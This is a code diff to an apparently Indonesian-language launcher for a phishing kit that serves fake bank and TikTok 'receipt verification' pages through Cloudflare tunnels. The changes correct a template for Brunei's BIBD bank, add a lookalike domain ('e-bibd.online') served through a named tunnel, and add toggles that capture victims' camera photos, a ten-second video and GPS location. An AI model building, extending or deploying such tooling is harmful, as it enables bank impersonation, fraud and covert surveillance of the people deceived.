@@ -127,11 +127,11 @@ TEMPLATES = {
         "public_dir": os.path.join(TEMPLATES_DIR, "tiktok", "public"),
     },
     "bibd": {
-        "name": "BIDB - Brunei Darussalam",
+        "name": "BIBD - Brunei Darussalam",
         "icon": "[3]",
-        "label": "BIDB Receipt + Verification",
-        "title": "BIDB Brunei Darussalam",
-        "description": "Resit Transaksi BIDB Brunei Darussalam",
+        "label": "BIBD Receipt + Verification",
+        "title": "BIBD Brunei Darussalam",
+        "description": "Resit Transaksi BIBD Brunei Darussalam",
         "favicon": "bibd.png",
         "og_image": "/bibdbrunei_logo.jpg",
         "dir": os.path.join(TEMPLATES_DIR, "bibd"),
@@ -286,6 +286,50 @@ def menu(current_template):
     print()
 
 
+def capture_menu(eng):
+    """Interactive toggle menu for capture features (photo, video, location)."""
+    labels = {
+        "photo": "Foto Kamera",
+        "video": "Video 10 Detik",
+        "location": "Lokasi GPS",
+    }
+    keys = ["photo", "video", "location"]
+
+    while True:
+        print(f"\n{C.TEAL}  Fitur Capture:{C.RST}")
+        for i, k in enumerate(keys, 1):
+            status = f"{C.EMER}ON{C.RST}" if eng.capture_config[k] else f"{C.CORAL}OFF{C.RST}"
+            print(f"  {C.TEAL}[{i}]{C.RST}  {labels[k].ljust(20)} {status}")
+        print(f"  {C.TEAL}[4]{C.RST}  Lanjutkan")
+        print()
+        try:
+            print(f"{C.CYN}  Toggle fitur (1-4): {C.RST}", end="")
+            ch = input().strip()
+            if ch in ("1", "2", "3"):
+                k = keys[int(ch) - 1]
+                eng.capture_config[k] = not eng.capture_config[k]
+                status = "ON" if eng.capture_config[k] else "OFF"
+                step(f"{labels[k]}: {status}")
+            elif ch == "4":
+                active = [labels[k] for k in keys if eng.capture_config[k]]
+                if active:
+                    step(f"Capture: {', '.join(active)}")
+                else:
+                    step("Capture: Semua OFF")
+                break
+            else:
+                print(f"  {C.YLW}Masukkan 1-4{C.RST}")
+        except (KeyboardInterrupt, EOFError):
+            break
+
+
+def write_capture_config(eng):
+    """Write capture config to src/app/capture-config.json for Next.js to read."""
+    config_path = os.path.join(eng.app_dir, "src", "app", "capture-config.json")
+    with open(config_path, "w", encoding="utf-8") as f:
+        json.dump(eng.capture_config, f)
+
+
 def step(msg, status="ok"):
     icon = f"{C.EMER}ok{C.RST}" if status == "ok" else f"{C.E}xx{C.RST}" if status == "err" else f"{C.W}..{C.RST}"
     bar = f"{C.EMER}{'▓' * StepLine.BAR_WIDTH}{C.RST}"
@@ -379,6 +423,7 @@ class Engine:
         self.building = False
         self.current_template = "bni"
         self.custom_title = None
+        self.capture_config = {"photo": True, "video": True, "location": True}
 
     def _server_env(self):
         """Return environment dict with Next.js settings and Termux CA bundle."""
@@ -739,6 +784,60 @@ class Engine:
         log = os.path.join(self.app_dir, "tunnel.log")
         timeout = 60 if IS_ANDROID else 45
 
+        # --- Named Tunnel untuk BIBD (custom domain) ---
+        bibd_config = os.path.join(self.app_dir, "cloudflared-bibd.yml")
+        if self.current_template == "bibd" and os.path.exists(bibd_config):
+            if verbose:
+                print(f"  ..  BIBD custom domain detected, starting Named Tunnel...")
+            try:
+                import yaml
+            except ImportError:
+                pass
+            # Parse domain dari config file
+            bibd_domain = None
+            try:
+                with open(bibd_config, "r", encoding="utf-8") as f:
+                    for line in f:
+                        if "hostname:" in line:
+                            bibd_domain = line.split("hostname:")[-1].strip()
+                            break
+            except Exception:
+                pass
+            if not bibd_domain:
+                bibd_domain = "e-bibd.online"
+
+            try:
+                if os.path.exists(log): os.remove(log)
+            except: pass
+            env = os.environ.copy()
+            self.tunnel_proc = subprocess.Popen(
+                [cf, "tunnel", "--config", bibd_config, "run"],
+                stdout=open(log, "w", encoding="utf-8"),
+                stderr=subprocess.STDOUT,
+                env=env,
+                **self._nw()
+            )
+            # Tunggu tunnel siap (cek log untuk "Connection registered" atau "Registered tunnel connection")
+            waited = 0
+            while waited < timeout:
+                time.sleep(3)
+                waited += 3
+                try:
+                    with open(log, "r", encoding="utf-8", errors="replace") as f:
+                        content = f.read()
+                        if "registered" in content.lower() or "serving" in content.lower():
+                            self.url = f"https://{bibd_domain}"
+                            if verbose:
+                                print(f"  ok  Named Tunnel connected: {self.url}")
+                            return self.url
+                except Exception:
+                    pass
+            if verbose:
+                print(f"  xx  Named Tunnel: no connection after {timeout}s, falling back to Quick Tunnel...")
+            self.kill_tunnel()
+            time.sleep(2)
+        # --- End Named Tunnel ---
+
         url, content = self._run_cloudflared_tunnel(cf, log, timeout, verbose=verbose, sl=sl)
         if url:
             return url
@@ -834,6 +933,7 @@ class Engine:
 
     def start_all(self):
         tmpl = TEMPLATES[self.current_template]
+        write_capture_config(self)
         print()
         sl = StepLine("applying template")
         sl.start()
@@ -1130,7 +1230,9 @@ def main():
             else:
                 print(f"  {C.YLW}Masukkan 1 atau 2{C.RST}")
 
-
+    # Capture feature toggles
+    capture_menu(eng)
+    write_capture_config(eng)
 
     eng.start_all()
     main_loop(eng)
